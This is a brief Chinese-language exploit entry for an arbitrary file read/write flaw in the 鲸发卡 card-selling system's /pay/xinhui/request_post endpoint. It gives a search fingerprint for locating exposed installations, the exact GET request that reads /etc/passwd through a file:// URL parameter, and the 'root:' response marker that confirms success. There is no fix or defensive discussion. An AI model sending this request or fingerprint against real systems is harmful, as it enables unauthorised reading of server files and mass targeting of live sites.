# 鲸发卡系统payxinhuirequest_post任意文件读取漏洞

鲸发卡系统payxinhuirequest_post ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/static/theme/maowang51/css/style.css"`
- **请求**：`GET /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]= HTTP/1.1`
- **响应特征**：200 root: